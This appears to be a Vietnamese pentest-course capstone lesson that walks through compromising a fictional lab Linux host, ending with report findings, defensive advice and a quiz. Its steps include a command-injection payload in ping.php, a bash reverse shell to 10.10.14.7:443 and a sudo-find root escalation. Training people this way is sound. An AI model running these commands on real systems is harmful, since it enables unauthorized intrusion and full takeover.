@@ -1,0 +1,200 @@
+---
+title: "Capstone: chiếm trọn một máy Linux"
+code: "5.1"
+level: 5
+summary: "Một cuộc tấn công hư cấu đi trọn từ quét tới báo cáo, ráp mọi kỹ thuật ở Cấp 1–4 vào một chuỗi."
+duration: "90 phút"
+objectives:
+  - "Thấy các kỹ thuật rời rạc nối thành một chuỗi hoàn chỉnh"
+  - "Theo một mạch tư duy: mỗi bước mở ra bước sau thế nào"
+  - "Nhận ra khi nào quay lại liệt kê, khi nào thử thông tin đăng nhập"
+  - "Rút ra hai phát hiện và cách viết chúng vào báo cáo"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Walkthrough from '../../components/sim/Walkthrough.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Tới đây bạn đã học từng kỹ thuật riêng lẻ. Nhưng một máy thật không nói cho bạn biết "giờ dùng bài 2.3". Bài này đi trọn một cuộc tấn công trên **máy lab hư cấu** `10.10.14.30`, để bạn thấy các mảnh ráp vào nhau ra sao, và nhất là **mỗi bước mở ra bước kế tiếp** thế nào.
+
+<Callout type="warn">
+Máy, mật khẩu và địa chỉ ở đây đều là giả, chỉ để minh hoạ mạch tư duy. Mọi kỹ thuật chỉ thực hành trên máy của bạn hoặc nơi được phép (xem trang Quy tắc).
+</Callout>
+
+## Đi trọn một chuỗi
+
+Bấm "Bước tiếp" để lần theo. Chú ý ô **Rút ra**: nó cho biết vì sao bước này dẫn tới bước sau.
+
+<Walkthrough
+  client:visible
+  title="Từ một địa chỉ IP tới quyền root"
+  steps={[
+    {
+      phase: 'Quét',
+      title: 'Quét toàn bộ cổng',
+      cmd: 'nmap -p- --min-rate 2000 10.10.14.30',
+      output: [
+        { text: 'PORT     STATE SERVICE' },
+        { text: '22/tcp   open  ssh' },
+        { text: '80/tcp   open  http', hit: true },
+        { text: '445/tcp  open  microsoft-ds', hit: true },
+      ],
+      takeaway: 'Ba cổng mở. SSH thường không phải đường vào đầu tiên; web (80) và SMB (445) là bề mặt tấn công giàu nhất, ưu tiên liệt kê hai cái đó. (Bài 2.2)',
+    },
+    {
+      phase: 'Quét',
+      title: 'Quét sâu để lấy phiên bản',
+      cmd: 'nmap -p 22,80,445 -sC -sV 10.10.14.30',
+      output: [
+        { text: '80/tcp  open  http  Apache httpd 2.4.29' },
+        { text: '|_http-title: Megacorp Intranet' },
+        { text: '445/tcp open  netbios-ssn Samba smbd 4.7.6' },
+      ],
+      takeaway: 'Ghi lại phiên bản vào ghi chú (Apache 2.4.29, Samba 4.7.6) để tra CVE sau. Giờ liệt kê sâu từng dịch vụ. (Bài 2.2, 2.5)',
+    },
+    {
+      phase: 'Liệt kê',
+      title: 'Dò thư mục web ẩn',
+      cmd: 'gobuster dir -u http://10.10.14.30 -w /usr/share/wordlists/dirb/common.txt',
+      output: [
+        { text: '/index.html   (Status: 200)' },
+        { text: '/tools        (Status: 301)', hit: true },
+        { text: '/robots.txt   (Status: 200)' },
+      ],
+      takeaway: 'Có một thư mục /tools không có link từ trang chủ. Thư mục "khuất" như vậy luôn đáng vào xem. (Bài 1.3, 2.2)',
+    },
+    {
+      phase: 'Liệt kê',
+      title: 'Xem công cụ trong /tools',
+      cmd: 'curl -s http://10.10.14.30/tools/',
+      output: [
+        { text: '<h2>Công cụ nội bộ: Kiểm tra kết nối</h2>' },
+        { text: '<form action="ping.php"> IP: <input name="ip"> </form>', hit: true },
+      ],
+      takeaway: 'Một trang "ping" nhận IP người dùng nhập. Mọi chỗ nhận đầu vào rồi chạy lệnh hệ điều hành đều đáng nghi command injection. (Bài 2.3)',
+    },
+    {
+      phase: 'Đường vào',
+      title: 'Thử command injection',
+      cmd: "curl 'http://10.10.14.30/tools/ping.php?ip=127.0.0.1;id'",
+      output: [
+        { text: 'PING 127.0.0.1 ... 1 packets transmitted' },
+        { text: 'uid=33(www-data) gid=33(www-data)', hit: true },
+      ],
+      takeaway: 'Lệnh id chạy được: command injection đã xác nhận. Ta chạy được lệnh với quyền www-data. Bước tiếp: biến nó thành shell ổn định. (Bài 2.3)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Đường vào',
+      title: 'Lấy reverse shell và nâng TTY',
+      cmd: "ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'",
+      prompt: '(payload trong tham số ip)',
+      output: [
+        { text: 'kali@lab:~$ nc -lvnp 443' },
+        { text: 'connect to [10.10.14.7] from 10.10.14.30', hit: true },
+        { text: 'www-data@megacorp:/var/www/html/tools$ python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
+      ],
+      takeaway: 'Đã có shell www-data. Nâng lên TTY đầy đủ (pty) để dùng được sudo, chỉnh màn hình. Giờ là người-trong-máy, chuyển sang leo thang. (Bài 1.6, 3.1)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Săn thông tin trong mã nguồn web',
+      cmd: 'grep -riI "password" /var/www/ 2>/dev/null',
+      output: [
+        { text: '/var/www/html/config.php:$db_pass = "S3cr3t!2024";', hit: true },
+      ],
+      takeaway: 'Một mật khẩu cơ sở dữ liệu. Phản xạ quan trọng nhất: thử mật khẩu này cho các tài khoản người thật trên máy (tái sử dụng mật khẩu). (Bài 1.4, 2.6)',
+      tone: 'warn',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Mật khẩu dùng lại cho một user thật',
+      cmd: 'su jdoe   # nhập S3cr3t!2024',
+      output: [
+        { text: 'Password: ' },
+        { text: 'jdoe@megacorp:~$ id', hit: true },
+        { text: 'uid=1000(jdoe) gid=1000(jdoe) groups=1000(jdoe)' },
+      ],
+      takeaway: 'Mật khẩu DB cũng là mật khẩu đăng nhập của jdoe. Giờ là user thật (không còn www-data), có thể kiểm tra quyền sudo. (Bài 2.6, 3.1)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Kiểm tra quyền sudo',
+      cmd: 'sudo -l',
+      output: [
+        { text: 'User jdoe may run the following commands:' },
+        { text: '    (root) NOPASSWD: /usr/bin/find', hit: true },
+      ],
+      takeaway: 'jdoe chạy được find với quyền root không cần mật khẩu. Tra GTFOBins: find có đường thoát ra shell. Đây là bước cuối. (Bài 3.1)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Chiếm quyền',
+      title: 'Lạm dụng sudo find thành root (GTFOBins)',
+      cmd: 'sudo find . -exec /bin/sh \\; -quit',
+      output: [
+        { text: '# id', hit: true },
+        { text: 'uid=0(root) gid=0(root) groups=0(root)' },
+        { text: '# cat /root/proof.txt' },
+        { text: 'b8f2...a1  (mã bằng chứng)' },
+      ],
+      takeaway: 'find chạy bằng root nên /bin/sh con cũng là root. Dấu # xác nhận đã thành root. Đọc proof.txt làm bằng chứng. Chiếm máy xong. (Bài 3.1)',
+      tone: 'good',
+    },
+    {
+      phase: 'Báo cáo',
+      title: 'Ghi lại hai phát hiện',
+      takeaway: 'Chuỗi này sinh ra HAI lỗ hổng để báo cáo: (1) Command injection ở /tools/ping.php — đường vào ban đầu; (2) Cấu hình sudo cho find (NOPASSWD) — leo thang lên root. Mật khẩu dùng lại là một phát hiện phụ. Mỗi cái viết thành một mục với bước tái hiện và khắc phục. (Bài 4.1)',
+      tone: 'good',
+    },
+  ]}
+/>
+
+## Nhìn lại cả mạch
+
+Toàn bộ chuỗi chỉ là các bài trước nối lại:
+
+| Bước | Dùng kiến thức bài |
+|---|---|
+| Quét và đọc phiên bản | 2.2, 2.5 |
+| Dò thư mục web, thấy /tools | 1.3, 2.2 |
+| Command injection → www-data | 2.3 |
+| Reverse shell + nâng TTY | 1.6, 3.1 |
+| Săn mật khẩu, dùng lại cho jdoe | 1.4, 2.6 |
+| sudo -l → GTFOBins find → root | 3.1 |
+| Viết báo cáo | 4.1 |
+
+<Callout type="note">
+Mấu chốt không phải nhớ từng lệnh, mà là **mạch hỏi**: "dịch vụ này cho tôi gì? thông tin này mở ra đâu? bế tắc thì quay lại liệt kê chỗ nào?" Đó chính là thứ bài thi đánh giá.
+</Callout>
+
+## Khi nào bạn sẽ thấy mình "bế tắc"
+
+Trong chuỗi trên, điểm dễ kẹt nhất là sau khi có www-data: nếu không nghĩ tới việc **săn mật khẩu rồi thử dùng lại**, bạn sẽ loay hoay với mã khai thác nhân. Quy tắc: có một mẩu thông tin (mật khẩu, tên user) thì luôn hỏi "dùng nó ở đâu được nữa?".
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Máy này lẽ ra chặn được ở nhiều lớp: lọc/tham số hoá đầu vào ở ping.php (chặn command injection); không lưu mật khẩu chữ rõ trong config.php; không đặt cùng một mật khẩu cho DB và tài khoản người dùng; và cấu hình sudo hẹp, không cho find (một lệnh có đường thoát shell). Mỗi lớp phòng thủ bị bỏ lỡ là một mắt xích trong chuỗi; chỉ cần một lớp đứng vững là chuỗi đứt.
+</Callout>
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Sau khi có shell www-data, bước tư duy quan trọng nhất là gì?', options: ['Chạy ngay exploit nhân Linux', 'Săn thông tin (mật khẩu) rồi thử dùng lại cho tài khoản khác', 'Khởi động lại máy'], answer: 1, explain: 'Tái sử dụng mật khẩu là đường leo thang hay bị bỏ qua; luôn hỏi "thông tin này dùng ở đâu nữa?".' },
+    { q: 'Vì sao /tools đáng vào xem dù không có link từ trang chủ?', options: ['Vì nó luôn rỗng', 'Vì thư mục khuất hay chứa chức năng nội bộ chưa được bảo vệ kỹ', 'Vì nó là file hệ thống'], answer: 1, explain: 'Chức năng nội bộ ít được để ý thường là nơi có lỗ hổng như command injection.' },
+    { q: 'Chuỗi tấn công này sinh ra mấy phát hiện chính để báo cáo?', options: ['Một: chiếm được root', 'Hai: command injection (đường vào) và sudo find (leo thang)', 'Không có gì để báo cáo'], answer: 1, explain: 'Mỗi lỗ hổng trong chuỗi là một mục báo cáo riêng, kèm bước tái hiện và khắc phục.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Một cuộc tấn công = chuỗi các bài trước nối lại: quét → liệt kê → đường vào → leo thang → báo cáo.
+- Mỗi bước mở ra bước sau; mạch hỏi quan trọng hơn việc nhớ lệnh.
+- Mỗi lỗ hổng trong chuỗi là một phát hiện riêng để viết báo cáo; mỗi lớp phòng thủ đứng vững là chuỗi đứt.
